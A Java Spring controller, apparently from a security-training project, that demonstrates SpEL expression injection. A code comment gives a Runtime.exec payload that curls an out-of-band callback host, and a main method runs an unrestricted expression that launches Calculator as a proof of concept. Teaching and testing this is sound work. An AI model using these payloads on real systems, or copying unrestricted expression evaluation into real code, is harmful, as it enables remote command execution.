package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.Collections;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        Object value = parser.parseExpression(expression).getValue(restrictedContext());
        return HtmlUtils.htmlEscape(String.valueOf(value));
    }

    /**
     * Evaluation context without type references (T(...)), constructors, method calls,
     * property access or bean references. Only literals and operators can be evaluated.
     * (SimpleEvaluationContext is not available in the Spring version this project uses.)
     */
    private static StandardEvaluationContext restrictedContext() {
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(typeName -> {
            throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
        });
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
        context.setBeanResolver(null);
        return context;
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

